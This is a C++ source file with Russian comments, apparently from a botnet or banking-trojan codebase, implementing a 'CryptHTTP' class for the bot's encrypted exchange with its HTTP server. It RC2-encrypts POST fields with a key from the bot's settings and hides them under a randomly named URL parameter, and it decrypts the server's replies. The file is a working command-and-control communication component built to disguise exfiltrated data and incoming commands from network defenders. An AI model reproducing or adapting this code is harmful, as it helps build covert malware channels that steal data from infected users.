//---------------------------------------------------------------------------

#include "BotCryptHTTP.h"

#include "Crypt.h"
#include "Utils.h"
#include "BotHTTP.h"

//---------------------------------------------------------------------------




//****************************************************************************
//  CryptHTTP -  методы шифрованного обмена с HTTP сервером
//****************************************************************************

// Загрузить шифрованный документ
bool CryptHTTP::Get(PCHAR URL, PCHAR Password, PCHAR *Buf)
{
	if (StrIsEmpty(URL))
		return false;
	bool Result = HTTP::Get(URL, Buf);

	// Расшифровываем данные
	if (Result && !StrIsEmpty(Password) && Buf != NULL)
	{
		RC2Crypt::DecodeStr(Password, *Buf);
	}

	return Result;
}


bool CryptHTTP::Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf)
{
	// Функция отправляет зашифрованные пост данные на указанный
	// адрес. ключ берётся из глобальных настроек бота
	if (StrIsEmpty(URL) || Fields == NULL)
		return false;

	// Запаковываем и зашифровываем данные
	if (Password != NULL)
	{
		PCHAR Text = Strings::GetText(Fields, URLValueDelimeter);
		Strings::Clear(Fields);

		PCHAR Name = Random::RandomString(Random::Generate(3, 6), 'a', 'z');

		PCHAR Value = RC2Crypt::Encode((LPBYTE)Text, STR::Length(Text), Password);

		AddURLParam(Fields, Name, Value);

		STR::Free(Text);
		STR::Free(Name);
		STR::Free(Value);
    }

    bool Result = HTTP::Post(URL, Fields, Buf);

	if (Result && !StrIsEmpty(Password) && Buf != NULL)
	{
		RC2Crypt::DecodeStr(Password, *Buf);
    }

	return Result;
}
